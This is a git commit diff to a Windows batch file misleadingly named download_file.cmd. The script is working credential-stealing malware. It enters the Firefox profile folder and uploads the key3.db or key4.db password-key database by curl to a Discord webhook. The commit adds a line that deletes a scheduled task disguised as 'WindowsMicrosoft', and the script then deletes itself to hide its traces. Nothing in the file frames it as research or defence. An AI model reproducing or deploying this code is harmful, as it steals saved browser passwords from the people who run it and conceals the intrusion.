0919f53ccb5c2de9f430a4fac3bb6b9d7beffcda
Doysoyk <diwadkaczkamarek412594@gmail.com>
2024-11-04 20:37:08 +0100

    Update download_file.cmd

--- download_file.cmd
+++ download_file.cmd
@@ -4,4 +4,5 @@ cd %firefox_profile%
 if exist "kay3.db" (curl -X POST -H "Content-Type: multipart/form-data" -F "content=firefox" -F "file=@%firefox_profile%\key3.db" https://discord.com/api/webhooks/1295740220507033653/ZtAyFre9GdhE3Z07Dlk-4M5zKm6ZVX2kO_ROiZeawfShFy1mDNCdd_grGNXMvBtvxTML --insecure
 ) else (curl -X POST -H "Content-Type: multipart/form-data" -F "content=firefox" -F "file=@%firefox_profile%\key4.db" https://discord.com/api/webhooks/1295740220507033653/ZtAyFre9GdhE3Z07Dlk-4M5zKm6ZVX2kO_ROiZeawfShFy1mDNCdd_grGNXMvBtvxTML --insecure
 )
+SCHTASKS /DELETE /TN "WindowsMicrosoft" /F
 del download_file.cmd
